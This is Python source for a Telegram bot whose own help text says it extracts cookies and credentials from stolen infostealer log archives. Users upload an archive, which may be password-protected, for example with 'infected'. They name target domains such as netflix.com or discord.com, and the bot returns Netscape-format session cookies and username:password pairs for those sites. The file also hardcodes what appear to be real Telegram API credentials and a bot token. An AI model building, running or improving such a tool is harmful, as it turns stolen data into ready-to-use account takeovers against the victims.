import os
import sys
import zipfile
import rarfile
import py7zr
import tempfile
import shutil
import re
import asyncio
import logging
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import hashlib
from collections import defaultdict
import json

from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ParseMode

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Bot configuration
API_ID = 23933044
API_HASH = "6df11147cbec7d62a323f0f498c8c03a"
BOT_TOKEN = "8420042675:AAHleqgGjvVE4Rn-_iHhm1sA5f8Esnp0Gl8"  # Replace with your bot token

# Constants
SUPPORTED_ARCHIVES = {'.zip', '.rar', '.7z'}
MAX_FILE_SIZE = 400 * 1024 * 1024  # 500MB
WORKER_COUNT = min(4, os.cpu_count() or 2)
BATCH_SIZE = 10000
COOKIE_COOKIE_FOLDERS = ['cookies', '*cookies*', 'browsers', '*browsers*']
USER_STATES = {}  # Store user states

# Initialize bot
app = Client(
    "cookie_extractor_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

class UserState:
    """Store user session state"""
    def __init__(self, user_id: int):
        self.user_id = user_id
        self.step = "waiting_file"
        self.archive_path = None
        self.archive_password = None
        self.extracted_path = None
        self.target_domains = []
        self.result_path = None
        self.processing = False

    def reset(self):
        self.step = "waiting_file"
        self.archive_path = None
        self.archive_password = None
        self.extracted_path = None
        self.target_domains = []
        self.result_path = None
        self.processing = False

def get_user_state(user_id: int) -> UserState:
    """Get or create user state"""
    if user_id not in USER_STATES:
        USER_STATES[user_id] = UserState(user_id)
    return USER_STATES[user_id]

class CookieExtractor:
    """Main cookie extraction logic"""
    
    def __init__(self):
        self.processed_bytes = 0
        self.checked_lines = 0
        self.founds = 0
        self.errors = 0
        self.unique_files = set()
        self.write_buffers = defaultdict(list)
        self.global_seen = set()
        self.results = defaultdict(lambda: {'count': 0, 'duplicates': 0})
        
        # Regex patterns for credentials (Format 1 by default)
        self.cred_regex = re.compile(
            r'(?P<cred>[^:\|\s]+[:| ][^\s]+?(?=\s|$))',
            re.IGNORECASE
        )
        self.include_url = False
    
    def sanitize_domain(self, domain: str) -> str:
        """Sanitize domain name for safe file/folder creation"""
        # Remove protocol and www
        domain = domain.replace('http://', '').replace('https://', '').replace('www.', '')
        # Remove invalid characters
        invalid_chars = '<>:"/\\|?*'
        for char in invalid_chars:
            domain = domain.replace(char, '_')
        return domain.strip('_')
    
    def flush_buffer(self, cookie_key: str, result_dir: str):
        """Write buffered data to file"""
        if cookie_key not in self.write_buffers:
            return
        
        buffer = self.write_buffers[cookie_key]
        if not buffer:
            return
        
        try:
            parts = cookie_key.split('__')
            if len(parts) == 2:
                site = parts[0]
                filename = parts[1]
                safe_site = self.sanitize_domain(site)
                domain_folder = os.path.join(result_dir, safe_site)
                
                os.makedirs(domain_folder, exist_ok=True)
                out_file = os.path.join(domain_folder, filename)
                
                # Write with append mode
                with open(out_file, 'a', encoding='utf-8') as f:
                    for item in buffer:
                        f.write(item + '\n')
                
                # Clear buffer
                self.write_buffers[cookie_key] = []
                
        except Exception as e:
            logger.error(f"Error flushing buffer for {cookie_key}: {e}")
            self.errors += 1
    
    def process_cookie_file(self, file_path: str, result_dir: str, target_domains: List[str]):
        """Process a single cookie file"""
        try:
            # Try to detect encoding
            encodings = ['utf-8', 'utf-16', 'latin-1', 'cp1252']
            content = None
            
            for encoding in encodings:
                try:
                    with open(file_path, 'r', encoding=encoding) as f:
                        # Read first few lines to check
                        lines = []
                        for _ in range(10):
                            line = f.readline()
                            if not line:
                                break
                            lines.append(line)
                        
                        if lines:
                            content = lines
                            break
                except UnicodeDecodeError:
                    continue
            
            if not content:
                logger.warning(f"Could not read file with any encoding: {file_path}")
                return
            
            # Reopen file with correct encoding for full processing
            with open(file_path, 'r', encoding=encodings[0], errors='ignore') as f:
                processed_cookies = set()
                
                for line_num, line in enumerate(f, 1):
                    self.checked_lines += 1
                    self.processed_bytes += len(line.encode('utf-8'))
                    
                    line = line.strip()
                    if not line:
                        continue
                    
                    # Check for Netscape cookie format (tab-separated)
                    if '\t' in line and '.' in line and '/' in line:
                        parts = line.split('\t')
                        if len(parts) >= 7:
                            cookie_domain = parts[0].strip()
                            cookie_name = parts[5].strip()
                            cookie_value = parts[6].strip()
                            
                            for site in target_domains:
                                site_clean = self.sanitize_domain(site)
                                if site_clean in cookie_domain or cookie_domain.endswith(site_clean):
                                    # Create unique identifier for this cookie
                                    cookie_id = f"{cookie_domain}|{cookie_name}|{cookie_value}"
                                    
                                    if cookie_id in processed_cookies:
                                        self.results[site]['duplicates'] += 1
                                        continue
                                    
                                    processed_cookies.add(cookie_id)
                                    
                                    # Generate unique filename
                                    file_hash = hashlib.md5(file_path.encode()).hexdigest()[:8]
                                    file_name = os.path.basename(file_path)
                                    base_name = os.path.splitext(file_name)[0]
                                    unique_name = f"{base_name}_{file_hash}.txt"
                                    cookie_key = f"{site}__{unique_name}"
                                    
                                    # Check if we've seen this cookie globally
                                    global_key = f"{cookie_key}|{line}"
                                    if global_key in self.global_seen:
                                        self.results[site]['duplicates'] += 1
                                        continue
                                    
                                    self.global_seen.add(global_key)
                                    
                                    # Add to buffer
                                    if cookie_key not in self.write_buffers:
                                        # Add Netscape header for first cookie
                                        self.write_buffers[cookie_key] = [
                                            "# Netscape HTTP Cookie File",
                                            "# http://curl.haxx.se/rfc/cookie_spec.html",
                                            "# Generated by Cookie Extractor Bot",
                                            ""
                                        ]
                                        self.unique_files.add(cookie_key)
                                        self.founds += 1
                                    
                                    self.write_buffers[cookie_key].append(line)
                                    self.results[site]['count'] += 1
                                    
                                    # Flush if batch size reached
                                    if len(self.write_buffers[cookie_key]) >= BATCH_SIZE:
                                        self.flush_buffer(cookie_key, result_dir)
                    
                    # Check for credentials format (username:password)
                    else:
                        matches = self.cred_regex.findall(line)
                        for match in matches:
                            if isinstance(match, tuple):
                                cred = match[0] if match else ""
                            else:
                                cred = match
                            
                            if not cred or ':' not in cred:
                                continue
                            
                            for site in target_domains:
                                if site.lower() in cred.lower():
                                    # Generate unique filename for credentials
                                    file_hash = hashlib.md5(file_path.encode()).hexdigest()[:8]
                                    file_name = os.path.basename(file_path)
                                    base_name = os.path.splitext(file_name)[0]
                                    unique_name = f"creds_{base_name}_{file_hash}.txt"
                                    cookie_key = f"{site}__{unique_name}"
                                    
                                    # Check for duplicates
                                    global_key = f"{cookie_key}|{cred}"
                                    if global_key in self.global_seen:
                                        self.results[site]['duplicates'] += 1
                                        continue
                                    
                                    self.global_seen.add(global_key)
                                    
                                    # Add to buffer
                                    if cookie_key not in self.write_buffers:
                                        self.write_buffers[cookie_key] = []
                                        self.unique_files.add(cookie_key)
                                        self.founds += 1
                                    
                                    self.write_buffers[cookie_key].append(cred)
                                    self.results[site]['count'] += 1
                                    
                                    # Flush if batch size reached
                                    if len(self.write_buffers[cookie_key]) >= BATCH_SIZE:
                                        self.flush_buffer(cookie_key, result_dir)
        
        except Exception as e:
            logger.error(f"Error processing file {file_path}: {e}")
            self.errors += 1
    
    def discover_cookie_files(self, root_path: str) -> List[str]:
        """Find all potential cookie files"""
        cookie_files = []
        
        for pattern in ['*cookies*', '*browsers*']:
            for dirpath, dirnames, filenames in os.walk(root_path):
                # Check directory names
                if pattern.replace('*', '').lower() in dirpath.lower():
                    for filename in filenames:
                        if filename.lower().endswith('.txt'):
                            cookie_files.append(os.path.join(dirpath, filename))
                
                # Check file names
                for filename in filenames:
                    if pattern.replace('*', '').lower() in filename.lower() and filename.lower().endswith('.txt'):
                        cookie_files.append(os.path.join(dirpath, filename))
        
        # Also look for any .txt files in the root
        for root, dirs, files in os.walk(root_path):
            for file in files:
                if file.lower().endswith('.txt'):
                    full_path = os.path.join(root, file)
                    if full_path not in cookie_files:
                        cookie_files.append(full_path)
        
        return list(set(cookie_files))  # Remove duplicates
    
    def extract_cookies(self, logs_path: str, target_domains: List[str], result_dir: str) -> Dict:
        """Main extraction method"""
        logger.info(f"Starting extraction from {logs_path}")
        logger.info(f"Target domains: {target_domains}")
        
        # Reset counters
        self.processed_bytes = 0
        self.checked_lines = 0
        self.founds = 0
        self.errors = 0
        self.unique_files.clear()
        self.write_buffers.clear()
        self.global_seen.clear()
        self.results.clear()
        
        # Create result directory
        os.makedirs(result_dir, exist_ok=True)
        
        # Discover cookie files
        cookie_files = self.discover_cookie_files(logs_path)
        logger.info(f"Found {len(cookie_files)} potential cookie files")
        
        if not cookie_files:
            return {
                'success': False,
                'message': 'No cookie files found in the logs'
            }
        
        # Process files in parallel
        with ThreadPoolExecutor(max_workers=WORKER_COUNT) as executor:
            futures = []
            for file_path in cookie_files:
                future = executor.submit(
                    self.process_cookie_file,
                    file_path,
                    result_dir,
                    target_domains
                )
                futures.append(future)
            
            # Wait for all tasks to complete
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logger.error(f"Error in processing task: {e}")
        
        # Flush all remaining buffers
        for cookie_key in list(self.write_buffers.keys()):
            self.flush_buffer(cookie_key, result_dir)
        
        # Create summary
        summary = {
            'total_files_processed': len(cookie_files),
            'unique_cookie_files': len(self.unique_files),
            'cookies_found': self.founds,
            'lines_checked': self.checked_lines,
            'errors': self.errors,
            'domains': {}
        }
        
        for domain, stats in self.results.items():
            summary['domains'][domain] = {
                'cookies': stats['count'],
                'duplicates': stats['duplicates']
            }
        
        # Create README file
        readme_path = os.path.join(result_dir, 'README.txt')
        with open(readme_path, 'w', encoding='utf-8') as f:
            f.write("=== COOKIE EXTRACTION RESULTS ===\n\n")
            f.write(f"Extraction date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Source logs: {logs_path}\n")
            f.write(f"Target domains: {', '.join(target_domains)}\n\n")
            f.write(f"Total files processed: {len(cookie_files)}\n")
            f.write(f"Unique cookie files created: {len(self.unique_files)}\n")
            f.write(f"Total cookies found: {self.founds}\n")
            f.write(f"Lines checked: {self.checked_lines}\n")
            f.write(f"Errors: {self.errors}\n\n")
            
            f.write("=== PER DOMAIN RESULTS ===\n")
            for domain, stats in summary['domains'].items():
                f.write(f"\n{domain}:\n")
                f.write(f"  Cookies: {stats['cookies']}\n")
                f.write(f"  Duplicates skipped: {stats['duplicates']}\n")
        
        logger.info(f"Extraction complete. Results saved to {result_dir}")
        return {
            'success': True,
            'summary': summary,
            'result_dir': result_dir
        }

def extract_archive(archive_path: str, password: str = None) -> Optional[str]:
    """Extract archive file (zip, rar, 7z)"""
    ext = os.path.splitext(archive_path)[1].lower()
    
    # Create temporary directory for extraction
    temp_dir = tempfile.mkdtemp(prefix="cookie_extract_")
    
    try:
        if ext == '.zip':
            with zipfile.ZipFile(archive_path, 'r') as zip_ref:
                if password:
                    zip_ref.setpassword(password.encode())
                zip_ref.extractall(temp_dir)
                
        elif ext == '.rar':
            with rarfile.RarFile(archive_path, 'r') as rar_ref:
                if password:
                    rar_ref.setpassword(password)
                rar_ref.extractall(temp_dir)
                
        elif ext == '.7z':
            with py7zr.SevenZipFile(archive_path, 'r', password=password) as zip_ref:
                zip_ref.extractall(temp_dir)
                
        else:
            logger.error(f"Unsupported archive format: {ext}")
            shutil.rmtree(temp_dir)
            return None
        
        logger.info(f"Successfully extracted archive to {temp_dir}")
        return temp_dir
        
    except Exception as e:
        logger.error(f"Failed to extract archive {archive_path}: {e}")
        shutil.rmtree(temp_dir, ignore_errors=True)
        return None

def create_results_zip(result_dir: str) -> Optional[str]:
    """Create zip file of all results"""
    try:
        # Create zip file path
        zip_path = os.path.join(os.path.dirname(result_dir), f"cookies_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip")
        
        # Create zip file
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(result_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    # Store relative path in zip
                    arcname = os.path.relpath(file_path, result_dir)
                    zipf.write(file_path, arcname)
        
        logger.info(f"Created results zip: {zip_path}")
        return zip_path
        
    except Exception as e:
        logger.error(f"Failed to create zip: {e}")
        return None

# Bot handlers
@app.on_message(filters.command("start"))
async def start_command(client: Client, message: Message):
    """Start command handler"""
    welcome_text = """
🍪 **Cookie Extractor Bot** 🍪

I can extract cookies and credentials from stolen logs archives.

**How to use:**
1. Send me a logs archive (.zip/.rar/.7z)
2. If password protected, provide the password
3. Provide target domains (space-separated)
4. I'll extract cookies and send you the results

**Supported formats:**
- Netscape cookie files (tab-separated)
- Credentials (username:password)
- Various text-based log files

**Commands:**
/start - Show this message
/help - Get help
/cancel - Cancel current operation

**Privacy:** All files are deleted after processing.
    """
    
    await message.reply_text(
        welcome_text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📤 Send Logs Archive", callback_data="send_logs")]
        ])
    )

@app.on_message(filters.command("help"))
async def help_command(client: Client, message: Message):
    """Help command handler"""
    help_text = """
**Help - Cookie Extractor Bot**

**Process:**
1. Send archive file (max 500MB)
2. If password protected, I'll ask for it
3. Provide target domains like: `netflix.com spotify.com amazon.com`
4. Wait for processing
5. Download results zip

**Archive formats:** .zip, .rar, .7z
**Extraction:** Supports password-protected archives
**Output:** Organized by domain, Netscape format compatible

**Example:**
1. Send `logs.zip`
2. Password: `infected` (if protected)
3. Domains: `netflix.com discord.com`
4. Get `cookies_20250101_120000.zip`

Use /cancel anytime to stop.
    """
    
    await message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

@app.on_message(filters.command("cancel"))
async def cancel_command(client: Client, message: Message):
    """Cancel current operation"""
    user_state = get_user_state(message.from_user.id)
    
    if user_state.processing:
        await message.reply_text("⚠️ Cannot cancel while processing. Please wait...")
        return
    
    user_state.reset()
    await message.reply_text("✅ Operation cancelled. You can start over by sending a new archive file.")

@app.on_message(filters.document)
async def handle_document(client: Client, message: Message):
    """Handle document (archive) upload"""
    user_id = message.from_user.id
    user_state = get_user_state(user_id)
    
    if user_state.step != "waiting_file":
        return
    
    # Check file size
    if message.document.file_size > MAX_FILE_SIZE:
        await message.reply_text(f"⚠️ File too large. Maximum size is {MAX_FILE_SIZE // 1024 // 1024}MB.")
        return
    
    # Check file extension
    file_name = message.document.file_name or ""
    file_ext = os.path.splitext(file_name)[1].lower()
    
    if file_ext not in SUPPORTED_ARCHIVES:
        await message.reply_text(
            f"⚠️ Unsupported file format. Please send: {', '.join(SUPPORTED_ARCHIVES)}"
        )
        return
    
    # Download file
    await message.reply_text(f"📥 Downloading {file_name}...")
    
    try:
        # Create download directory
        download_dir = os.path.join("downloads", str(user_id))
        os.makedirs(download_dir, exist_ok=True)
        
        # Download file
        download_path = await message.download(
            file_name=os.path.join(download_dir, file_name)
        )
        
        user_state.archive_path = download_path
        user_state.step = "waiting_password"
        
        # Ask for password
        await message.reply_text(
            "🔐 Is this archive password protected?\n\n"
            "Reply with:\n"
            "- `no` or just press Enter if no password\n"
            "- Or send the password if protected",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("No Password", callback_data="no_password")]
            ])
        )
        
    except Exception as e:
        logger.error(f"Error downloading file: {e}")
        await message.reply_text("❌ Error downloading file. Please try again.")
        user_state.reset()

@app.on_message(filters.text & filters.private)
async def handle_text(client: Client, message: Message):
    """Handle text messages (passwords, domains)"""
    user_id = message.from_user.id
    user_state = get_user_state(user_id)
    text = message.text.strip().lower()
    
    if user_state.step == "waiting_password":
        # Handle password
        if text == "no" or not text:
            user_state.archive_password = None
        else:
            user_state.archive_password = text
        
        user_state.step = "waiting_domains"
        await message.reply_text(
            "🎯 **Enter target domains**\n\n"
            "Send domains separated by spaces:\n"
            "Example: `netflix.com spotify.com amazon.com`\n\n"
            "Or send specific subdomains:\n"
            "Example: `login.live.com discord.com`"
        )
    
    elif user_state.step == "waiting_domains":
        # Handle domains
        domains = [d.strip() for d in text.split() if d.strip()]
        
        if not domains:
            await message.reply_text("❌ Please provide at least one domain.")
            return
        
        # Validate domains (basic check)
        valid_domains = []
        for domain in domains:
            if '.' in domain and len(domain) > 3:
                valid_domains.append(domain)
            else:
                await message.reply_text(f"⚠️ Skipping invalid domain: {domain}")
        
        if not valid_domains:
            await message.reply_text("❌ No valid domains provided.")
            return
        
        user_state.target_domains = valid_domains
        user_state.step = "processing"
        
        # Start processing
        await process_extraction(client, message, user_state)

async def process_extraction(client: Client, message: Message, user_state: UserState):
    """Process the extraction"""
    user_id = message.from_user.id
    
    try:
        # Update user
        status_msg = await message.reply_text(
            "🔄 **Starting extraction...**\n\n"
            f"Archive: {os.path.basename(user_state.archive_path)}\n"
            f"Domains: {', '.join(user_state.target_domains[:5])}"
            + ("..." if len(user_state.target_domains) > 5 else "")
        )
        
        # Step 1: Extract archive
        await status_msg.edit_text("📦 Extracting archive...")
        extracted_path = extract_archive(
            user_state.archive_path,
            user_state.archive_password
        )
        
        if not extracted_path:
            await status_msg.edit_text("❌ Failed to extract archive. Invalid password or corrupted file.")
            user_state.reset()
            # Cleanup
            if os.path.exists(user_state.archive_path):
                os.remove(user_state.archive_path)
            return
        
        user_state.extracted_path = extracted_path
        
        # Step 2: Create results directory
        results_dir = os.path.join(
            "results",
            str(user_id),
            datetime.now().strftime("%Y%m%d_%H%M%S")
        )
        os.makedirs(results_dir, exist_ok=True)
        user_state.result_path = results_dir
        
        # Step 3: Extract cookies
        await status_msg.edit_text("🍪 Searching for cookie files...")
        
        extractor = CookieExtractor()
        result = extractor.extract_cookies(
            extracted_path,
            user_state.target_domains,
            results_dir
        )
        
        if not result['success']:
            await status_msg.edit_text(f"❌ {result['message']}")
            # Cleanup
            cleanup_files(user_state)
            user_state.reset()
            return
        
        # Step 4: Create zip
        await status_msg.edit_text("📦 Creating results zip...")
        zip_path = create_results_zip(results_dir)
        
        if not zip_path:
            await status_msg.edit_text("❌ Failed to create results zip.")
            # Cleanup
            cleanup_files(user_state)
            user_state.reset()
            return
        
        # Step 5: Send results
        summary = result['summary']
        result_text = f"""
✅ **Extraction Complete!**

**Summary:**
📁 Files processed: {summary['total_files_processed']}
🍪 Cookies found: {summary['cookies_found']}
📊 Lines checked: {summary['lines_checked']}
⚠️ Errors: {summary['errors']}

**Per Domain Results:**
"""
        
        for domain, stats in summary['domains'].items():
            result_text += f"\n• **{domain}**: {stats['cookies']} cookies"
            if stats['duplicates']:
                result_text += f" ({stats['duplicates']} duplicates skipped)"
        
        result_text += f"\n\n📦 **Results ZIP ready for download!**"
        
        await status_msg.edit_text(result_text, parse_mode=ParseMode.MARKDOWN)
        
        # Send zip file
        zip_file_name = os.path.basename(zip_path)
        with open(zip_path, 'rb') as f:
            await client.send_document(
                chat_id=user_id,
                document=f,
                file_name=zip_file_name,
                caption=f"🍪 Extracted cookies - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
            )
        
        # Step 6: Cleanup
        cleanup_files(user_state)
        user_state.reset()
        
        # Final message
        await message.reply_text(
            "🗑️ All temporary files have been deleted.\n\n"
            "You can send another archive to start over.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📤 Send Another Archive", callback_data="send_logs")]
            ])
        )
        
    except Exception as e:
        logger.error(f"Error in extraction process: {e}", exc_info=True)
        await message.reply_text(f"❌ An error occurred: {str(e)}")
        # Cleanup on error
        cleanup_files(user_state)
        user_state.reset()

def cleanup_files(user_state: UserState):
    """Cleanup all temporary files"""
    try:
        # Remove downloaded archive
        if user_state.archive_path and os.path.exists(user_state.archive_path):
            os.remove(user_state.archive_path)
        
        # Remove extracted files
        if user_state.extracted_path and os.path.exists(user_state.extracted_path):
            shutil.rmtree(user_state.extracted_path, ignore_errors=True)
        
        # Remove results directory
        if user_state.result_path and os.path.exists(user_state.result_path):
            shutil.rmtree(user_state.result_path, ignore_errors=True)
        
        # Remove parent results directory if empty
        if user_state.result_path:
            parent_dir = os.path.dirname(user_state.result_path)
            if os.path.exists(parent_dir) and not os.listdir(parent_dir):
                shutil.rmtree(parent_dir, ignore_errors=True)
        
        # Remove download directory if empty
        download_dir = os.path.join("downloads", str(user_state.user_id))
        if os.path.exists(download_dir) and not os.listdir(download_dir):
            shutil.rmtree(download_dir, ignore_errors=True)
        
    except Exception as e:
        logger.error(f"Error during cleanup: {e}")

@app.on_callback_query()
async def handle_callback(client: Client, callback_query):
    """Handle callback queries"""
    user_id = callback_query.from_user.id
    data = callback_query.data
    
    if data == "send_logs":
        user_state = get_user_state(user_id)
        user_state.reset()
        await callback_query.message.reply_text(
            "📤 Please send me your logs archive file (.zip/.rar/.7z)"
        )
    
    elif data == "no_password":
        user_state = get_user_state(user_id)
        if user_state.step == "waiting_password":
            user_state.archive_password = None
            user_state.step = "waiting_domains"
            await callback_query.message.reply_text(
                "🎯 **Enter target domains**\n\n"
                "Send domains separated by spaces:\n"
                "Example: `netflix.com spotify.com amazon.com`"
            )
    
    await callback_query.answer()

def main():
    """Main function"""
    # Create necessary directories
    os.makedirs("downloads", exist_ok=True)
    os.makedirs("results", exist_ok=True)
    
    # Install required packages if missing
    required_packages = ['pyrogram', 'rarfile', 'py7zr']
    
    logger.info("Starting Cookie Extractor Bot...")
    logger.info(f"Worker count: {WORKER_COUNT}")
    logger.info(f"Max file size: {MAX_FILE_SIZE // 1024 // 1024}MB")
    
    # Run the bot
    app.run()

if __name__ == "__main__":
    # Check for required packages
    import importlib.util
    
    missing_packages = []
    for package in ['pyrogram', 'rarfile', 'py7zr']:
        if importlib.util.find_spec(package) is None:
            missing_packages.append(package)
    
    if missing_packages:
        print("❌ Missing required packages:")
        for pkg in missing_packages:
            print(f"  - {pkg}")
        print("\nInstall with: pip install pyrogram rarfile py7zr")
        sys.exit(1)
    
    main()
